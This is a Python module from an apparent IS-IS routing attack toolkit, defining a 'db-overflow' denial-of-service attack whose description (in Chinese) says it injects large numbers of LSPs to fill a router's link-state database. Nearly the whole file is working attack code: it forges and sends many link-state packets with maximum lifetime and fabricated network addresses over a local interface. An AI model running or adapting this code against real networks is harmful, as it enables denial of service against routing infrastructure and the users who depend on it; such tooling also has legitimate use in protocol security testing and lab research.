from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import DoSConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender
from isis_attack.network.adapter import get_local_mac


class DBOverflowAttack(BaseAttack):
    name = "db-overflow"
    description = "注入大量 LSP 填满链路状态数据库 (LSDB)"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface, packet_rate=self.config.packet_rate, max_packets=0,
        )

    def launch(self) -> AttackResult:
        for i in range(self.config.lsp_count):
            frag_id = f"{i:02X}"
            pkt = build_lsp_with_tlvs(
                sys_id=self.config.sys_id,
                lsp_id=f"{self.config.sys_id}.{frag_id}-00",
                src_mac=self._src_mac, level=self.config.level,
                sequence=1, remaining_lifetime=65535,
                network_addr=f"10.{i // 256}.{i % 256}.0",
            )
            self._sender.send_l2(pkt)
        return AttackResult(
            success=True, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"DB 溢出: {self.config.lsp_count} LSPs injected",
        )

